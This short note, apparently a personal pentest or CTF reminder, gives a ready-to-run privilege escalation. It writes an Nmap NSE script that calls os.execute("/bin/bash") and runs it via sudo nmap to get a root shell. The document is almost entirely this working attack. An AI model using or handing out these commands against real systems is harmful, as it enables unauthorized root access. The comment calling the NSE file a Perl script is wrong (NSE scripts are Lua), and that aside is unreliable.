This is a reminder because what is in [gtfobins](https://gtfobins.github.io/gtfobins/nmap/#sudo) is misleading. 
```bash
 # create nmap script, which is just a perl script that opens bash I believe
 echo 'os.execute("/bin/bash")' > /tmp/rootme.nse

# verify
cat /tmp/rootme.nse

# exploit
sudo /usr/bin/nmap --script /tmp/rootme.nse
```
